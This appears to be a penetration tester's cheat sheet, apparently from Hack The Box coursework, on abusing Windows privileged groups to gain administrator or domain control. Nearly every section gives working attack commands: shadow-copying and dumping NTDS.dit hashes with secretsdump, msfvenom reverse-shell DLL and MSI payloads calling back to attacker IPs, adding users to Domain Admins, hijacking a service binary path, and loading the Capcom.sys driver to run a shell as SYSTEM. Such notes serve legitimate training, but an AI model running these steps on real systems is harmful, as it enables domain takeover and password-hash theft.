---
description: whoami /groups
---

# Windows Group Privileges

## **Backup Operators ⭐**

Members of `Backup Operators` has `SeBackup` and `SeRestore` privileges. `SeBackup` Privilege allows us to traverse any folder and list the folder contents. This will let us copy any files even if there is no ACE for us in the folder’s ACL.

To copy the file we cannot use our standard copy command.

### **Copying Protected/Sensitive files**

[https://github.com/giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege) Using this tool we can exploit the `SeBackupPrivilege`and copy the file

```powershell
PS C:\\htb> Import-Module .\\SeBackupPrivilegeUtils.dll
PS C:\\htb> Import-Module .\\SeBackupPrivilegeCmdLets.dll
```

Import libraries

If the Privilege is disabled, we can enable it with Set-SeBackupPrivilege.

* `PS C:\\htb> Set-SeBackupPrivilege` → enable privilege
* `Copy-FileSeBackupPrivilege 'C:\\Confidential\\2021 Contract.txt' .\\Contract.txt` → copy protected file.

### **Attacking a Domain Controller - Copying NTDS.dit**

NTDS.dit contains password hashes of domain users. located in `C:\\Windows\\NTDS\\ntds.dit`

If we try to copy the `ntds.dit` file using `Copy-FileSeBackupPrivilege` cmdlet we get error as the file is in continuous use.

to solve this we are going to create a shadow copy of the C drive and we can read the content of ntds.dit from this shadow copied dir.

```powershell
PS C:\\htb> diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\\Windows\\Temp\\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

PS C:\\htb> dir E:

    Directory: E:\\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/6/2021   1:00 PM                Confidential
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---        3/24/2021   6:20 PM                Program Files
d-----        9/15/2018   2:06 AM                Program Files (x86)
d-----         5/6/2021   1:05 PM                Tools
d-r---         5/6/2021  12:51 PM                Users
d-----        3/24/2021   6:38 PM                Windows
```

Once we have created shadow copy we can read the file as

```powershell
PS C:\\htb> Copy-FileSeBackupPrivilege E:\\Windows\\NTDS\\ntds.dit C:\\Tools\\ntds.dit

```

To decrypt the ntds.dit file we need System Registry Hives

* `reg save HKLM\\SYSTEM C:\\temp\\system.back`
* `reg save HKLM\\SAM C:\\temp\\sam.back`

Once we have ntds.dit and system hive, we can extract hashes using SecretsDump from Impacket

* `dollarboysushil@htb[/htb]$ secretsdump.py -ntds ntds.dit -system system.back LOCAL`

## **DnsAdmins ⭐**

Members of the [DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins) group have access to DNS information on the network.

we are going to generate a malicious DLL to add a user to the `domain admins` group using `msfvenom`. We can also create dll to get reverse shell.

```
dollarboysushil@htb[/htb]$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

dollarboysushil@htb[/htb]$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.65 LPORT=5555 -f dll > dbs.dll -> to create reverseshell dll.
```

Then transfer the dll file and load the dll file as:

```
C:\\htb> dnscmd.exe /config /serverlevelplugindll C:\\Users\\netadm\\Desktop\\adduser.dll

```

this dll will be loaded, next the DNS service is started.

```
C:\\htb> sc.exe stop dns
C:\\htb> sc.exe start dns
```

If we donot have permission to start/stop the dns, then we should play the waiting game.

* `C:\\htb> net group "Domain Admins" /dom` → checking the Domain Admins groups shows we are succesfully added to the group.

## **Server Operators ⭐**

The [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) group allows members to administer Windows servers without needing assignment of Domain Admin privileges. Membership of this group confers the powerful `SeBackupPrivilege` and `SeRestorePrivilege` privileges and the ability to control local services.

#### **Querying the AppReadiness Service**

```
C:\\htb> sc qc AppReadiness

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AppReadiness
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\\Windows\\System32\\svchost.exe -k AppReadiness -p
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : App Readiness
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

Examining the AppReadiness Service

* Service starts a SYSTEM
* **BINARY\_PATH\_NAME:** The path to the executable file for the service (`C:\\Windows\\System32\\svchost.exe -k AppReadiness -p`).

Lets modify the service binary path,

```
C:\\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

[SC] ChangeServiceConfig SUCCESS
```

here we are changing binary path to execute command which adds our current user to the default user administrator group

* `C:\\htb> sc start AppReadiness` → Then start the service.
* `C:\\htb> net localgroup Administrators` → checking the Local Admin Group Membership

Now we are member of local admin group

lets dump the ntlm password hashes from the DC

* `dollarboysushil@htb[/htb]**$** secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator`

## Always Install Elevated ⭐

```powershell
PS C:\\htb> reg query HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer

HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

```powershell
PS C:\\htb> reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer

HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

Our enumeration shows us that the `AlwaysInstallElevated` key exists, so the policy is indeed enabled on the target system.

We will now generate a malicious MSI package and execute it via cmd to obtain a reverse shell with system privileges.

* `dollarboysushil@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi`

transfer this msi file and setup netcat listener

* `C:\\htb> msiexec /i c:\\users\\htb-student\\desktop\\aie.msi /quiet /qn /norestart` → execute the file

## **Print Operators ⭐**

[Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#print-operators) is another highly privileged group, which grants its members the `SeLoadDriverPrivilege`, rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it down.

plus it allows an account to load system driver.

Now we have power to load system driver. we will import  driver `Capcom.sys` which contains function to allow any user to execute shell code with system privileges.

`Capcom.sys` driver can be downloaded from here [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)

[https://github.com/JoshMorrison99/SeLoadDriverPrivilege](https://github.com/JoshMorrison99/SeLoadDriverPrivilege)

From above github we will use `Capcom.sys` `LoadDriver.exe` and `ExploitCapcom.exe`

additionally we can create a malicious `rev.exe` using metasploit so that we can execute this later when Capcom.sys driver loaded

*   `.\\LoadDriver.exe System\\CurrentControlSet\\MyService C:\\Users\\Test\\Capcom.sys` → to load the `Capcom.sys` driver

    . This should return `NTSTATUS: 00000000, WinError: 0`. If it doesn't try changing the location of `Capcom.sys` or where you are executing `LoadDriver.exe`
* `.\\ExploitCapcom.exe C:\\Windows\\Place\\to\\reverseshell\\rev.exe` to execute our malicious exe with privileged user.

## **Event Log Readers**

#### **Searching Security Logs Using wevtutil**

```powershell
PS C:\\htb> wevtutil qe Security /rd:true /f:text | Select-String "/user"

        Process Command Line:   net use T: \\\\fs01\\backups /user:tim MyStr0ngP@ssword
```

## **Hyper-V Administrators**

The [Hyper-V Administrators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators) group has full access to all [Hyper-V features](https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines). If Domain Controllers have been virtualized, then the virtualization admins should be considered Domain Admins. They could easily create a clone of the live Domain Controller and mount the virtual disk offline to obtain the NTDS.dit file and extract NTLM password hashes for all users in the domain.
